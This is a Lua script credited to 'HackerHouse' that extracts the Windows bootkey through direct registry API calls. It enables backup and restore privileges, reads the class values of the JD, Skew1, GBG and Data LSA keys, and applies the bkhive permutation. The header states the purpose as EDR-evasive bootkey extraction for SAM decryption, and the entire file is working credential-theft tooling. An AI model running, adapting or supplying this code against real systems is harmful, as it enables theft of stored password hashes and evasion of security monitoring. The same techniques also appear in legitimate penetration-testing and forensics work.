--[[
    Bootkey Extractor - Standalone Direct API Version
    
    This script extracts the Windows bootkey using direct registry APIs.
    
    Based on bkhive methodology but using RegQueryInfoKeyA for stealth.
    
    Author: HackerHouse
    Purpose: EDR-evasive bootkey extraction for SAM decryption
]]--

local ffi = require("ffi")
local bit = require("bit")

-- FFI definitions for Windows API
ffi.cdef[[
    typedef void* HANDLE;
    typedef HANDLE HKEY;
    typedef unsigned long DWORD;
    typedef long LONG;
    typedef const char* LPCSTR;
    typedef char* LPSTR;
    typedef int BOOL;
    
    // Registry functions
    LONG RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, DWORD samDesired, HKEY* phkResult);
    LONG RegCloseKey(HKEY hKey);
    LONG RegQueryInfoKeyA(HKEY hKey, LPSTR lpClass, DWORD* lpcchClass, DWORD* lpReserved, DWORD* lpcSubKeys, DWORD* lpcbMaxSubKeyLen, DWORD* lpcbMaxClassLen, DWORD* lpcValues, DWORD* lpcbMaxValueNameLen, DWORD* lpcbMaxValueLen, DWORD* lpcbSecurityDescriptor, void* lpftLastWriteTime);
    
    // Privilege functions  
    typedef struct {
        DWORD PrivilegeCount;
        struct {
            int64_t Luid;
            DWORD Attributes;
        } Privileges[1];
    } TOKEN_PRIVILEGES;
    
    BOOL OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, HANDLE* TokenHandle);
    BOOL LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, int64_t* lpLuid);
    BOOL AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, TOKEN_PRIVILEGES* NewState, DWORD BufferLength, TOKEN_PRIVILEGES* PreviousState, DWORD* ReturnLength);
    HANDLE GetCurrentProcess();
    BOOL CloseHandle(HANDLE hObject);
    
    // System functions
    DWORD GetComputerNameA(LPSTR lpBuffer, DWORD* nSize);
    void GetSystemTime(void* lpSystemTime);
]]

-- Load required libraries
local advapi32 = ffi.load("advapi32")
local kernel32 = ffi.load("kernel32")

-- Enable required privileges for registry access
local function enable_privilege(privilege_name)
    local process_handle = kernel32.GetCurrentProcess()
    local token_handle = ffi.new("HANDLE[1]")
    
    if advapi32.OpenProcessToken(process_handle, 0x00000020, token_handle) == 0 then
        return false
    end
    
    local luid = ffi.new("int64_t[1]")
    if advapi32.LookupPrivilegeValueA(nil, privilege_name, luid) == 0 then
        kernel32.CloseHandle(token_handle[0])
        return false
    end
    
    local tp = ffi.new("TOKEN_PRIVILEGES")
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid[0]
    tp.Privileges[0].Attributes = 0x00000002  -- SE_PRIVILEGE_ENABLED
    
    local result = advapi32.AdjustTokenPrivileges(token_handle[0], false, tp, 0, nil, nil)
    kernel32.CloseHandle(token_handle[0])
    
    return result ~= 0
end

-- Get computer name for identification
local function get_computer_name()
    local buffer = ffi.new("char[256]")
    local size = ffi.new("DWORD[1]")
    size[0] = 256
    
    if kernel32.GetComputerNameA(buffer, size) ~= 0 then
        return ffi.string(buffer, size[0])
    end
    return "UNKNOWN"
end

-- Extract class value from a registry key using RegQueryInfoKeyA
local function get_registry_class_value(key_path)
    print(string.format("[DEBUG] Extracting class value from: %s", key_path))
    
    local hkey = ffi.new("HKEY[1]")
    local hklm = ffi.cast("HKEY", 0x80000002)  -- HKEY_LOCAL_MACHINE
    local key_path_cstr = ffi.new("char[?]", #key_path + 1)
    ffi.copy(key_path_cstr, key_path, #key_path)
    
    -- Open the registry key
    local result = advapi32.RegOpenKeyExA(hklm, key_path_cstr, 0, 0x20019, hkey)  -- KEY_READ
    if result ~= 0 then
        print(string.format("[ERROR] Failed to open key %s: error %d", key_path, result))
        return nil
    end
    
    -- Query key info to get the class value
    local class_buffer = ffi.new("char[256]")
    local class_size = ffi.new("DWORD[1]")
    class_size[0] = 256
    
    local query_result = advapi32.RegQueryInfoKeyA(
        hkey[0], 
        class_buffer, 
        class_size,
        nil, nil, nil, nil, nil, nil, nil, nil, nil
    )
    
    advapi32.RegCloseKey(hkey[0])
    
    if query_result == 0 and class_size[0] > 0 then
        local class_value = ffi.string(class_buffer, class_size[0])
        print(string.format("[DEBUG] %s class value: %s", key_path:match("([^\\]+)$"), class_value))
        return class_value
    else
        print(string.format("[ERROR] Failed to query class for %s: error %d", key_path, query_result))
        return nil
    end
end

-- Direct bootkey extraction using registry class values (bkhive method)
local function extract_bootkey_direct()
    print("[DEBUG] === DIRECT BOOTKEY EXTRACTION ===")
    print("[DEBUG] Using RegQueryInfoKeyA to extract class values (EDR evasion)")
    
    -- Extract class values from the 4 LSA keys (bkhive methodology)
    local jd_class = get_registry_class_value("SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD")
    local skew1_class = get_registry_class_value("SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1")  
    local gbg_class = get_registry_class_value("SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG")
    local data_class = get_registry_class_value("SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data")
    
    if not jd_class or not skew1_class or not gbg_class or not data_class then
        print("[ERROR] Failed to extract one or more class values")
        return nil
    end
    
    -- Combine class values into bootkey string
    local combined_string = jd_class .. skew1_class .. gbg_class .. data_class
    print(string.format("[DEBUG] Combined bootkey string: %s", combined_string))
    
    -- Convert hex string to binary
    local binary_data = {}
    for i = 1, #combined_string, 2 do
        local hex_byte = combined_string:sub(i, i+1)
        table.insert(binary_data, tonumber(hex_byte, 16))
    end
    
    -- Apply bkhive permutation table to get real bootkey
    local permutation = {0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}
    local bootkey_bytes = {}
    
    for i = 1, 16 do
        bootkey_bytes[i] = binary_data[permutation[i] + 1]  -- Lua arrays are 1-indexed
    end
    
    -- Convert to hex string
    local bootkey = ""
    for i = 1, 16 do
        bootkey = bootkey .. string.format("%02x", bootkey_bytes[i])
    end
    
    print(string.format("[DEBUG] Real bootkey extracted (direct API): %s", bootkey))
    return bootkey
end

-- Main execution
local function main()
    print("Bootkey Extractor - Direct API Version")
    print("=====================================")
    print()
    
    local computer_name = get_computer_name()
    print(string.format("[INFO] Target system: %s", computer_name))
    
    -- Enable required privileges
    print("[INFO] Enabling required privileges...")
    local backup_enabled = enable_privilege("SeBackupPrivilege")
    local restore_enabled = enable_privilege("SeRestorePrivilege")
    
    if backup_enabled then
        print("[INFO] SeBackupPrivilege enabled successfully")
    else
        print("[WARNING] Failed to enable SeBackupPrivilege")
    end
    
    if restore_enabled then
        print("[INFO] SeRestorePrivilege enabled successfully") 
    else
        print("[WARNING] Failed to enable SeRestorePrivilege")
    end
    
    -- Extract bootkey using direct API calls
    print()
    print("[INFO] Attempting direct bootkey extraction via registry API...")
    local bootkey = extract_bootkey_direct()
    
    if bootkey then
        print()
        print("=== BOOTKEY EXTRACTION SUCCESSFUL ===")
        print(string.format("Bootkey: %s", bootkey))
        print()
        return true
    else
        print()
        print("[ERROR] Bootkey extraction failed")
        return false
    end
end

-- Execute main function
if main() then
    os.exit(0)
else
    os.exit(1)
end